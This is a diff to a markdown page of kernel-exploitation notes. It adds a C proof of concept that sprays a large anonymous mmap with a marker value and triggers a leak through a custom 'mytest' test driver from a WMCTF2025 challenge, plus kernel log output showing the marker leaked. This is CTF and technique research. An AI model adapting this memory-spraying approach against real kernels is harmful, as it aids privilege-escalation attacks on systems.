@@ -187,6 +187,52 @@ int main(int argc, char** argv, char** envp)
 ```
 - example: [WMCTF2025 wm_easyker](https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-5) by [@Polaris](https://www.xmcve.com/)
 - I test it in my vmware ubuntu22.04, it's ok
+  - script: The 'mytest' driver is written to facilitate verification
+```c
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+
+typedef struct req {
+        unsigned long kernel_addr;
+        unsigned long len;
+}req;
+
+int main(int argc, char** argv, char** envp)
+{
+        int fd = open("/dev/mytest", O_RDWR);
+        unsigned long kbase = 0xffffffffb7800000;
+        unsigned long size = 0x20000000;
+        char* buf = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+        unsigned long* pbuf = buf;
+        for (int i = 0; i < size / 8; i++) {
+                // pbuf[i] = 0xdeadbeefbeefdead;
+                pbuf[i] = 0x1122334455667788;
+        }
+        for (int i = 0; i < size / 0x1000; i++) {
+        //        strcpy(buf+i*0x1000, "XiaozaYaPwner");
+        }
+
+        printf("buf = %p\n", buf);
+        req req = { .kernel_addr = kbase+0x3200000+0x1f3000, .len = 0x100 };
+        //ioctl(fd, 0x8888, &req);
+        //ioctl(fd, 0x7331, &req);
+        //puts("[!] find over!");
+        ioctl(fd, 0x1337, &req);
+//      getchar();
+        puts("[!] Exp End!");
+        return 0;
+}
+```
+  - result:
 ```bash
 [382880.248520] [*] Leak Data:
 [382880.248527]   0000 0x6159617a6f616958 0xdead0072656e7750 0xdeadbeefbeefdead 0xdeadbeefbeefdead   XiaozaYaPwner.\xadޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
@@ -215,6 +261,15 @@ int main(int argc, char** argv, char** envp)
 [382917.639800]   00a0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
 [382917.639811]   00c0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
 [382917.639821]   00e0 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead 0xdeadbeefbeefdead   \xad\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭޭ\xde\xef\xbeﾭ\xde
+[383800.184558] [*] Leak Data:
+[383800.184565]   0000 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184590]   0020 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184599]   0040 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184609]   0060 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184618]   0080 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184628]   00a0 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184637]   00c0 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3".
+[383800.184646]   00e0 0x1122334455667788 0x1122334455667788 0x1122334455667788 0x1122334455667788   .wfUD3"..wfUD3"..wfUD3"..wfUD3"
 ```
 - Root Case: Since I have not found the cause of this phenomenon, I consulted [@BitsByWill](https://github.com/BitsByWill) and he quickly gave me a root case analysis.I would like to express my sincerest thanks to [@BitsByWill](https://github.com/BitsByWill), but I have not verified it carefully yet, so I will not express it for the time being.
 
